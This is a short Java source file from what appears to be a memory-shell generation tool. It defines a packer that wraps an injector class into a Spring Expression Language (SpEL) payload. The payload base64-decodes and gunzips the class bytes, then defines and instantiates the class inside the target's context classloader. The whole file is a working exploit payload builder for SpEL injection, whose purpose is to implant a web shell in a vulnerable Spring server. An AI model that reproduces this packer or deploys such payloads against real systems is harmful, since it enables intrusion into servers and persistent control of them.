package com.reajason.javaweb.memshell.packer.spel;

import com.reajason.javaweb.memshell.config.GenerateResult;
import com.reajason.javaweb.memshell.packer.Packer;
import com.reajason.javaweb.memshell.utils.CommonUtil;
import lombok.SneakyThrows;
import java.util.Base64;;

/**
 * @author ReaJason
 * @since 2024/12/13
 */
public class SpELSpringIOUtilsGzipPacker implements Packer {
    String template = "T(org.springframework.cglib.core.ReflectUtils).defineClass('{{className}}',T(org.apache.commons.io.IOUtils).toByteArray(new java.util.zip.GZIPInputStream(new java.io.ByteArrayInputStream(T(org.springframework.util.Base64Utils).decodeFromString('{{base64Str}}')))),T(java.lang.Thread).currentThread().getContextClassLoader()).newInstance()";

    @Override
    @SneakyThrows
    public String pack(GenerateResult generateResult) {
        return template.replace("{{className}}", generateResult.getInjectorClassName())
                .replace("{{base64Str}}", Base64.getEncoder().encodeToString(CommonUtil.gzipCompress(generateResult.getInjectorBytes())));
    }
}